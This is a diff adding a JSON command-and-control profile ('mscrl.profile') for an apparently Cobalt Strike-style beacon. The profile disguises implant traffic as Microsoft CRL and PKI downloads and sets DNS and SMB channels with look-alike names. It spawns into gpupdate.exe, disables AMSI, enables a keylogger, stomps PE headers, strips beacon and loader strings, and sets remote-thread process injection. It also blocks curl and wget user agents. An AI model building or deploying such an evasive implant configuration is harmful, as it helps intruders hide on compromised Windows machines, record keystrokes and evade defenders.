@@ -1,0 +1,184 @@
+{
+  "name": "mscrl.profile",
+  "http_config": {
+    "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.104 Safari/537.36",
+    "headers": {
+      "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+      "Accept-Language": "en-US,en;q=0.5",
+      "Connection": "close"
+    },
+    "server_headers": {
+      "Content-Type": "text/html;charset=UTF-8",
+      "Server": "nginx",
+      "Connection": "close"
+    },
+    "block_useragents": ["curl*", "lynx*", "wget*"]
+  },
+  "https_config": {
+    "certificate": {
+      "common_name": "Contoso.com",
+      "organization": "Contoso LLC.",
+      "organizational_unit": "contoso.org",
+      "country": "US",
+      "state": "CA",
+      "locality": "California",
+      "validity": 365
+    }
+  },
+  "reconnect_interval": 38500,
+  "jitter": 33,
+  "max_errors": 10,
+  "http_get": {
+    "path": "/pki/mscorp/cps/default.htm",
+    "method": "GET",
+    "headers": {
+      "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+      "Accept-Language": "en-US,en;q=0.5",
+      "Connection": "close"
+    },
+    "metadata": {
+      "type": "cookie",
+      "name": "mscrlId",
+      "encoding": "base64"
+    },
+    "server_headers": {
+      "Content-Type": "text/html",
+      "x-ms-version": "2009-09-19",
+      "x-ms-lease-status": "unlocked",
+      "x-ms-blob-type": "BlockBlob",
+      "Vary": "Accept-Encoding",
+      "Connection": "close",
+      "TLS_version": "tls1.2",
+      "Strict-Transport-Security": "max-age=31536000",
+      "X-RTag": "RT"
+    }
+  },
+  "http_post": {
+    "path": "/pki/mscorp/crl/msitwww1.crl",
+    "method": "GET",
+    "headers": {
+      "Accept": "*/*",
+      "Accept-Language": "en",
+      "Connection": "close"
+    },
+    "id": {
+      "type": "header",
+      "name": "Content-MD5",
+      "encoding": "base64url"
+    },
+    "output": {
+      "type": "header",
+      "name": "x-ms-request-id",
+      "encoding": "base64url"
+    },
+    "server_headers": {
+      "Age": "1919",
+      "Content-Type": "application/octet-stream",
+      "x-ms-blob-type": "BlockBlob",
+      "x-ms-lease-status": "unlocked",
+      "x-ms-version": "572",
+      "Connection": "close"
+    }
+  },
+  "dns_config": {
+    "max_length": 255,
+    "idle_resolver": "8.8.8.8",
+    "max_txt_size": 220,
+    "ttl": 1,
+    "stager_prepend": ".wwwds.",
+    "stager_subhost": ".e2867.dsca.",
+    "beacon_subhost": "d-bx.",
+    "get_A": "d-1ax.",
+    "get_AAAA": "d-4ax.",
+    "get_TXT": "d-1tx.",
+    "put_metadata": "d-1mx",
+    "put_output": "d-1ox.",
+    "ns_response": "zero"
+  },
+  "tcp_config": {
+    "port": 8000,
+    "frame_header": ""
+  },
+  "smb_config": {
+    "pipename": "ntsvcs##",
+    "stager_pipename": "scerpc##",
+    "frame_header": ""
+  },
+  "post_ex": {
+    "spawnto_x86": "%windir%\\\\syswow64\\\\gpupdate.exe",
+    "spawnto_x64": "%windir%\\\\sysnative\\\\gpupdate.exe",
+    "obfuscate": true,
+    "smartinject": true,
+    "amsi_disable": true,
+    "keylogger": "SetWindowsHookEx",
+    "thread_hint": "ntdll.dll!RtlUserThreadStart+0x1000",
+    "pipename": "DserNamePipe##, PGMessagePipe##, MsFteWds##"
+  },
+  "stage": {
+    "userwx": false,
+    "stomppe": true,
+    "obfuscate": true,
+    "cleanup": true,
+    "sleep_mask": true,
+    "smartinject": true,
+    "checksum": 0,
+    "compile_time": "2020-10-17T04:32:14Z",
+    "entry_point": 170001,
+    "name": "WWanMM.dll",
+    "magic_mz_x86": "MZRE",
+    "magic_mz_x64": "MZAR",
+    "magic_pe": "EA",
+    "allocator": "VirtualAlloc",
+    "module_x86": "wwanmm.dll",
+    "module_x64": "wwanmm.dll",
+    "transform_x86": {
+      "prepend": "",
+      "strrep": {
+        "ReflectiveLoader": "",
+        "beacon.dll": ""
+      }
+    },
+    "transform_x64": {
+      "prepend": "",
+      "strrep": {
+        "ReflectiveLoader": "",
+        "beacon.x64.dll": ""
+      }
+    }
+  },
+  "process_inject": {
+    "allocator": "NtMapViewOfSection",
+    "min_alloc": 16700,
+    "startrwx": true,
+    "userwx": false,
+    "transform_x86": {
+      "prepend": ""
+    },
+    "transform_x64": {
+      "prepend": ""
+    },
+    "execute": {
+      "CreateThread": "ntdll.dll!RtlUserThreadStart+0x1000",
+      "SetThreadContext": true,
+      "NtQueueApcThread-s": true,
+      "CreateRemoteThread": "kernel32.dll!LoadLibraryA+0x1000",
+      "RtlCreateUserThread": true
+    }
+  },
+  "http_stager": {
+    "uri_x86": "/pki/mscorp/crl/Msitwww1.crl",
+    "uri_x64": "/pki/mscorp/CRL/msitwww1.crl",
+    "headers": {
+      "Accept": "*/*",
+      "Accept-Language": "en",
+      "Connection": "close"
+    },
+    "server_headers": {
+      "Content-Type": "text/html;charset=utf-8",
+      "Connection": "close",
+      "Server": "ZOOM",
+      "X-Robots-Tag": "noindex, nofollow",
+      "X-Content-Type-Options": "nosniff"
+    }
+  }
+}
